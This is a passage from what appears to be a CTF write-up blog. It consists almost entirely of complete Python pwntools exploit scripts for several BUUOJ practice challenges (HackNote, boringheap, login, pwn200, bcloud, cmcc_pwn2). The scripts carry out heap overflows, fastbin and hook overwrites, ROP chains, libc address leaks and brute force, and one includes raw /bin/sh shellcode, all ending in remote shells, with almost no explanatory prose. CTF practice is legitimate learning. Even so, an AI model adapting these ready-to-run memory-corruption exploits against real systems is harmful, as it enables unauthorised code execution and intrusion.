class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("HackNote")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./true")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	def add(size,content):</span><br><span class="line">		sh.sendlineafter("-----------------","1")</span><br><span class="line">		sh.sendlineafter("Input the Size",str(size))</span><br><span class="line">		sh.sendafter(":",content)</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter("-----------------","2")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">	def edit(idx,content):</span><br><span class="line">		sh.sendlineafter("-----------------","3")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">		sh.sendafter(":",content)</span><br><span class="line">	shellcode = asm("xor rax,rax")</span><br><span class="line">	shellcode += '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'</span><br><span class="line">	__free_hook = 0x6CD5E8</span><br><span class="line">	__malloc_hook = 0x6CB788</span><br><span class="line">	add(0x18,'\x11'*0x18)</span><br><span class="line">	edit(0, '\x11'*0x18)</span><br><span class="line">	add(0x18, '\x12'*0x18)</span><br><span class="line">	add(0x40-8,'\x13'*0x38)</span><br><span class="line">	add(0x10, '\x14'*0x10)</span><br><span class="line">	add(0x10, '\x15'*0x10)</span><br><span class="line">	edit(0,'\x11'*0x18+'\x81'+'\n')</span><br><span class="line">	free(2)</span><br><span class="line">	free(1)</span><br><span class="line">	add(0x80-8,'A'*0x18+p64(0x41)+p64(__malloc_hook - 0x10  - 6)+'\n')</span><br><span class="line">	add(0x38,'aaaa\n')</span><br><span class="line">	add(0x38,'aaaaaa' + p64(__malloc_hook + 8) + shellcode + "\n")</span><br><span class="line">	add(0x88,'\n')</span><br><span class="line">	'''</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">	'''</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",26378,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x96-shanghai2019-boringheap"><a href="#0x96-shanghai2019-boringheap" class="headerlink" title="0x96 shanghai2019_boringheap"></a>0x96 shanghai2019_boringheap</h2><h3 id="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"><a href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18" class="headerlink" title="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"></a>该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		#sh = process("./pwn",env={"LD_PRELOAD":"/home/pig/Pig/CTF/ShangHai/19.11.2/pwn/boringheap/libc.so"})</span><br><span class="line">		sh = process("./pwn")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23_x64.so")</span><br><span class="line">	def add(size,content):</span><br><span class="line">		sh.sendlineafter("5.","1")#0x20 0x30 0x40</span><br><span class="line">		sh.sendlineafter("3.Large",str(size))</span><br><span class="line">		sh.sendafter(":",content)</span><br><span class="line">	def edit(idx,size,content):</span><br><span class="line">		sh.sendlineafter("5.","2")</span><br><span class="line">		sh.sendlineafter("?",str(idx))</span><br><span class="line">		sh.sendlineafter("?",str(size))</span><br><span class="line">		sh.sendafter(":",content)</span><br><span class="line">	def show(idx):</span><br><span class="line">		sh.sendlineafter("5.","4")</span><br><span class="line">		sh.sendlineafter("?",str(idx))</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter("5.","3")</span><br><span class="line">		sh.sendlineafter("?",str(idx))</span><br><span class="line">	add(3,"\x11" * 0x40)</span><br><span class="line">	add(2,'\x12' * 0x30)</span><br><span class="line">	add(3,'\x13' * 0x40)</span><br><span class="line">	add(3,'\x14' * 0x40)</span><br><span class="line">	add(1,p64(0) + p64(0x51) + "\n")</span><br><span class="line">	#payload = 'a' * 0x28 + '\xa1'</span><br><span class="line">	payload = p64(0)*3 + p64(0x91) + '\n'</span><br><span class="line">	edit(1,0x80000000,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	add(2,'\n')</span><br><span class="line">	show(5)</span><br><span class="line">	libc = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 2 + 8 - lib.symbols['__malloc_hook']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	add(3,'\x15' * 0x40)</span><br><span class="line">	free(2)</span><br><span class="line">	free(4)</span><br><span class="line">	edit(6,0,p64(__malloc_hook - (0x7fd96e4f4b10 - 0x7fd96e4f4b2d)) + '\n')</span><br><span class="line">	</span><br><span class="line">	add(3,'\n')</span><br><span class="line">	add(3,'\x00'*3 + p64(__malloc_hook + 0x10 + 48) + p64(0)*2 + p64(0x51) + '\n')</span><br><span class="line">	add(3,'a' * 0x17+'\n')</span><br><span class="line">	show(9)</span><br><span class="line">	sh.recvuntil("a" * 0x17 + '\n')</span><br><span class="line">	heap_base = (u64(sh.recvuntil("\n",True)[-6:].ljust(8,'\x00')) >> 12) << 12</span><br><span class="line">	pie = heap_base - 0x203000</span><br><span class="line">	chunk_list = pie + 0x2020C0</span><br><span class="line">	</span><br><span class="line">	#edit(8,0,'\x00'*3 + p64(heap_base + 0x140) + p64(0) * 2 + "\n")</span><br><span class="line">	edit(8,0,'\x00'*3 + p64(0) * 5 + "\n")</span><br><span class="line">	#add(3,p64(0) * 3 + p64(0xffffffffffffffff) + "\n")</span><br><span class="line">	edit(9,0,p64(0) * 3 + p64(__malloc_hook - 0x10) + "\n")</span><br><span class="line">	#add(3,'\x00' * 3 + p64(0) + p64(__free_hook) + p64(0) + p64(binsh) + "\n")</span><br><span class="line">	#edit(3,0,p64(system) + "\n")</span><br><span class="line">	#free(5)</span><br><span class="line">	#add(1,'/bin/sh\n')</span><br><span class="line">	'''</span><br><span class="line">0x45216 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">	'''</span><br><span class="line">	one_gadget = libc + 0xf1147</span><br><span class="line">	add(2,p64(one_gadget) + '\n')</span><br><span class="line">	sh.sendlineafter("5.","1")</span><br><span class="line">	sh.sendlineafter("3.","1")</span><br><span class="line">	log.success("heap_base: " + hex(heap_base))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("__malloc_hook: " + hex(__malloc_hook))	</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	'''</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">	'''</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",26065,1)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x97-shanghai2019-login"><a href="#0x97-shanghai2019-login" class="headerlink" title="0x97 shanghai2019_login"></a>0x97 shanghai2019_login</h2><h3 id="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-1"><a href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-1" class="headerlink" title="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"></a>该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</h3><h3 id="爆破libc"><a href="#爆破libc" class="headerlink" title="爆破libc"></a>爆破libc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./login")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23_x64.so")</span><br><span class="line">	def register(idx,size,content):</span><br><span class="line">		sh.sendlineafter(":","2")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">		sh.sendlineafter(":",str(size))</span><br><span class="line">		sh.sendafter(":",str(content))</span><br><span class="line">	def login(idx,size,content):</span><br><span class="line">		sh.sendlineafter(":","1")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">		sh.sendlineafter(":",str(size))</span><br><span class="line">		sh.sendafter(":",content)</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(":","3")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">	def edit(idx,content):</span><br><span class="line">		sh.sendlineafter(":","4")</span><br><span class="line">		sh.sendlineafter(":",str(idx))</span><br><span class="line">		sh.sendafter(":",str(content))</span><br><span class="line">	def bomb(pos,content):</span><br><span class="line">		global sh</span><br><span class="line">		for i in range(0,0xff):</span><br><span class="line">			payload = p64(0) + p64(0x21) + p64(elf.got['__libc_start_main'] + 5 - pos) + p64(elf.plt['puts']) + p64(pos + 1)</span><br><span class="line">        		edit(1,payload)</span><br><span class="line">        		login(0,pos + 1,chr(i) + content)</span><br><span class="line">			data = sh.recvuntil('---Menu---')</span><br><span class="line">			print(i)</span><br><span class="line">			if(data.find("success") != -1):</span><br><span class="line">				log.success("get!" + hex(i))</span><br><span class="line">				return i</span><br><span class="line">	register(0,0x68,'\x11' * 0x68)</span><br><span class="line">	register(1,0x68,'\x22' * 0x68)</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	#0x400B94 call</span><br><span class="line">	#0x400B53 read</span><br><span class="line">	#login(0,0x7fffffff,p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']))</span><br><span class="line">	#edit(0,p64(0))</span><br><span class="line"></span><br><span class="line">	#payload = p64(0) + p64(0x21) + p64(elf.got['__libc_start_main'] + 5) + p64(elf.plt['puts']) + p64(1)</span><br><span class="line">	#edit(1,payload)</span><br><span class="line">	#login(0,1,'\x7f')</span><br><span class="line">	#__libc_start_main = chr(bomb(0,''))</span><br><span class="line">	__libc_start_main = '\x7f'</span><br><span class="line">	__libc_start_main = chr(bomb(1,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main = chr(bomb(2,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main = chr(bomb(3,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main = chr(bomb(4,__libc_start_main)) + __libc_start_main</span><br><span class="line">	#__libc_start_main = chr(bomb(5,__libc_start_main)) + __libc_start_main</span><br><span class="line">	__libc_start_main = '\x40' + __libc_start_main</span><br><span class="line">	__libc_start_main = u64(__libc_start_main.ljust(8,'\x00'))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	log.success("__libc_start_main: " + hex(__libc_start_main))	</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	log.success("__libc_start_main_got: " + hex(elf.got['__libc_start_main']))</span><br><span class="line">	log.success("puts_plt: " + hex(elf.plt['puts'])) </span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"></span><br><span class="line">	payload = p64(0) + p64(0x21) + p64(binsh) + p64(system) + p64(8)</span><br><span class="line">	edit(1,payload)</span><br><span class="line">	login(0,8,'/bin/sh\x00')</span><br><span class="line"></span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",25522,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x98-xdctf2015-pwn200"><a href="#0x98-xdctf2015-pwn200" class="headerlink" title="0x98 xdctf2015_pwn200"></a>0x98 xdctf2015_pwn200</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("node3.buuoj.cn",28965)</span><br><span class="line">elf = ELF("bof.dms")</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">offset = 112</span><br><span class="line">pop3_ret = 0x08048629</span><br><span class="line">payload = offset * b"a"</span><br><span class="line">payload += p32(elf.plt['write'])</span><br><span class="line">payload += p32(pop3_ret)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(4)</span><br><span class="line">payload += p32(elf.symbols['main'])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc = u32(sh.recvuntil("\xf7")[-4:]) - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh =  libc + lib.search(b'/bin/sh\x00').next()</span><br><span class="line">payload = offset * b"a"</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x99-bctf2016-bcloud"><a href="#0x99-bctf2016-bcloud" class="headerlink" title="0x99 bctf2016_bcloud"></a>0x99 bctf2016_bcloud</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bcloud_bctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(">>")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	if size > 0:</span><br><span class="line">		sh.recvuntil(":")</span><br><span class="line">		sh.send(content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.recvuntil(">>")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(">>")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./bcloud_bctf_2016")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23_x32.so")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.send("b" * 0x40)</span><br><span class="line">	sh.recvuntil("b" * 0x40)</span><br><span class="line">	heap_base = (u32(sh.recv(4)) >> 12) << 12</span><br><span class="line">	topChunk = heap_base + 0xd8</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.send(0x40 * "a")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline("\xff" * 0x4)</span><br><span class="line">	notesize_addr = 0x0804B0A0</span><br><span class="line">	notelist_addr = 0x0804B120</span><br><span class="line">	add(notesize_addr - topChunk - 0x10,'')</span><br><span class="line">	payload = p32(0x400) * 10</span><br><span class="line">	payload = payload.ljust(0x0804B120 - 0x0804B0A0,'\x00')</span><br><span class="line">	payload += p32(elf.got['free'])</span><br><span class="line">	payload += p32(notesize_addr)</span><br><span class="line">	payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">	add(0x400,payload + "\n")</span><br><span class="line">	edit(0,p32(elf.plt['puts']) + "\n")</span><br><span class="line">	free(2)</span><br><span class="line">	__libc_start_main = u32(sh.recvuntil('\xf7')[-4:])</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	edit(0,p32(system) + "\n")</span><br><span class="line">	edit(1,payload + p32(binsh) + "\n")</span><br><span class="line">	free(3)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",29792,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x100-cmcc-pwn2"><a href="#0x100-cmcc-pwn2" class="headerlink" title="0x100 cmcc_pwn2"></a>0x100 cmcc_pwn2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = remote("node3.buuoj.cn",25076)</span><br><span class="line">elf = ELF("pwnme2")</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">pop_ebp_ret = 0x08048680</span><br><span class="line">offset = 0x70</span><br><span class="line">payload = offset * "\xaa"</span><br><span class="line">payload += p32(elf.plt['gets'])</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(0x0804A060)</span><br><span class="line">payload += p32(0x080485CB)</span><br><span class="line">sh.sendlineafter("Please input:",payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("/flag")</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<hr>
